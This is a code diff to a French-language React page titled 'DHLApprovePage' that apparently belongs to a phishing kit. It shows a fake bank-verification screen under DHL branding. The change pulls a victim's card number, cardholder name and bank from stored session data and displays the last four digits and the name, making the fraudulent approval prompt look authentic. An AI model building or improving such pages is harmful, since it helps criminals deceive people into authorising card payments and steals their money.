@@ -6,6 +6,20 @@ export default function DHLApprovePage() {
   const [dots, setDots] = useState(".");
   const [bankName, setBankName] = useState("Votre Banque");
   const [bankFlag, setBankFlag] = useState("🏦");
+  const [cardLast4, setCardLast4] = useState("****");
+  const [cardholderName, setCardholderName] = useState("");
+  const [currentDate, setCurrentDate] = useState("");
+
+  // Format date in French
+  const formatDate = (): string => {
+    const date = new Date();
+    const options: Intl.DateTimeFormatOptions = { 
+      day: 'numeric', 
+      month: 'long', 
+      year: 'numeric' 
+    };
+    return date.toLocaleDateString('fr-FR', options);
+  };
 
   // Bank flags mapping
   const getBankFlag = (name: string): string => {
@@ -30,7 +44,10 @@ export default function DHLApprovePage() {
       setDots((prev) => (prev.length >= 3 ? "." : prev + "."));
     }, 500);
 
-    // Get bank name from URL or localStorage
+    // Set current date
+    setCurrentDate(formatDate());
+
+    // Get session data from URL
     const params = new URLSearchParams(window.location.search);
     const sessionId = params.get("session");
     
@@ -41,6 +58,12 @@ export default function DHLApprovePage() {
           if (data.bankName) {
             setBankName(data.bankName);
             setBankFlag(getBankFlag(data.bankName));
+          }
+          if (data.cardNumber) {
+            setCardLast4(data.cardNumber.slice(-4));
+          }
+          if (data.cardholderName) {
+            setCardholderName(data.cardholderName);
           }
         })
         .catch(() => {});
@@ -59,7 +82,28 @@ export default function DHLApprovePage() {
             </div>
           </div>
           <div className="text-3xl font-bold mb-2" data-testid="bank-name">{bankName}</div>
-          <CardTitle className="text-2xl font-bold">
+          
+          {/* Current Date */}
+          <div className="text-sm text-white/80 font-medium" data-testid="current-date">
+            {currentDate}
+          </div>
+
+          {/* Card Last 4 + Cardholder Name */}
+          {cardholderName && (
+            <div className="bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg py-3 px-4 mx-8" data-testid="card-info">
+              <div className="text-white/90 text-sm font-medium mb-1">
+                Carte bancaire
+              </div>
+              <div className="text-white text-lg font-bold tracking-wider">
+                •••• {cardLast4}
+              </div>
+              <div className="text-white/80 text-sm mt-1 uppercase tracking-wide">
+                {cardholderName}
+              </div>
+            </div>
+          )}
+
+          <CardTitle className="text-2xl font-bold pt-2">
             Vérification bancaire requise
           </CardTitle>
           <CardDescription className="text-white/90 text-base">
